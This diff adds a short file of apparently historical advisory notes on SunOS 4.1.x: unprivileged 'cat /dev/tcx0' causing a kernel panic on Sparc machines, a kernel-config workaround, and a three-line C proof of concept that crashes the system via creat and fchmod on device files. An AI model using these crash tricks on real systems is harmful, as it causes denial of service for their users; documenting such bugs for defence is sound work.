@@ -1,0 +1,47 @@
+
+
+If you try to read /dev/tcx0 on a SunOS 4.1.4 Sparc 20 
+(it didn't work on a 10),
+you will cause a system panic.  How do you read it, you ask?
+Simply "cat /dev/tcx0" or "ls /dev/tcx0/*".  You don't need special
+privileges to use it.
+
+
+===================================================================
+
+
+This will also crash s Sparc 5.
+
+
+===================================================================
+
+
+Work around:
+1. Install tcx frame buffer.
+2. Edit GENERIC file as below and create new kernel.
+< device-driver tcx             # 24-bit accelerated color frame buffer
+---
+> #device-driver        tcx             # 24-bit accelerated color frame buffer
+
+
+
+===================================================================
+
+
+SunOS 4.1.x crash
+
+I found the following three-liner to crash SunOS 4.1.x.  It works on
+/dev/fb and /dev/audio on some machines; you need permission to open the
+device.
+
+main(int argc, char *argv[]) {
+  int fd;
+
+  fd = creat(argc < 2 ? "/dev/fb" : argv[1], 0755);
+  if (fd < 0) perror("creat"), exit(1);
+  fchmod(fd, 0755);             /* BOOM */
+}
+
+
+
+===================================================================
